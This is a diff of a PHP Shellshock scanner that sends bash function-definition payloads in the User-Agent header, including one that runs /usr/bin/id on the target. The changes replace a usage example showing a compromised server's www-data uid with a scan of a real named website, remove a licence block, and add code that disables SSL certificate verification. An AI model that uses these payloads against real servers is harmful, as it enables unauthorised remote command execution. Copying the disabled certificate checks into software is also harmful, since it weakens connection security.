@@ -16,29 +16,16 @@
 		Usage: php5 <scriptname>.php <target>
 		
 		Example:
-		$ php5 bashbleed_scanner.php vulnsite.vuln
-		[*] Bashbleed FOUND !!!
-		[*] uid=33(www-data) gid=33(www-data) groups=33(www-data)
-		[*] The server responded: 500 
+		$ php5 bashbleed_scanner.php southpark.de
+		[!] No Vulnerabilities Found
+		[*] The server responded: 200 OK
 		$
-		
-		///////////////////////////////////////////////////////////////////////////
-		DO WHAT THE FUCK YOU WANT TO PUBLIC LICENSE
-                    Version 2, December 2004
-
- 		Copyright (C) 2004 Sam Hocevar
-  		14 rue de Plaisance, 75014 Paris, France
- 		Everyone is permitted to copy and distribute verbatim or modified
- 		copies of this license document, and changing it is allowed as long
- 		as the name is changed.
-
-            	DO WHAT THE FUCK YOU WANT TO PUBLIC LICENSE
-   		TERMS AND CONDITIONS FOR COPYING, DISTRIBUTION AND MODIFICATION
-
-  		0. You just DO WHAT THE FUCK YOU WANT TO.
-		///////////////////////////////////////////////////////////////////////////
 
 	*/
+
+
+
+
 
 		$ch = curl_init(); // create cURL handle (ch)
 		if (!$ch) {
@@ -50,9 +37,11 @@
 			$ret = curl_setopt($ch, CURLOPT_HEADER,         0);
 			$ret = curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
 			$ret = curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-			$ret = curl_setopt($ch, CURLOPT_USERAGENT, 	"() { foo;};echo 'R4spu71n'");
+			$ret = curl_setopt($ch, CURLOPT_USERAGENT, 	"() { foo;};echo R4spu71n");
 			$ret = curl_setopt($ch, CURLOPT_TIMEOUT,        30);
-
+			if (substr(strtolower(trim($argv[1])), 0, 5)=='https') { 
+				curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); 
+			}
 			// execute
 			$ret = curl_exec($ch);
 
@@ -77,6 +66,9 @@
 						$ret2 = curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1);
 						$ret2 = curl_setopt($ch2, CURLOPT_USERAGENT,      "() { foo;};echo;/usr/bin/id");
 						$ret2 = curl_setopt($ch2, CURLOPT_TIMEOUT,        30);
+						if (substr(strtolower(trim($argv[1])), 0, 5)=='https') { 
+							curl_setopt($ch2, CURLOPT_SSL_VERIFYPEER, false); 
+						}
 						$ret2 = curl_exec($ch2);
 						echo "[*] " . $ret2;
 						curl_close($ch2); // close cURL handler
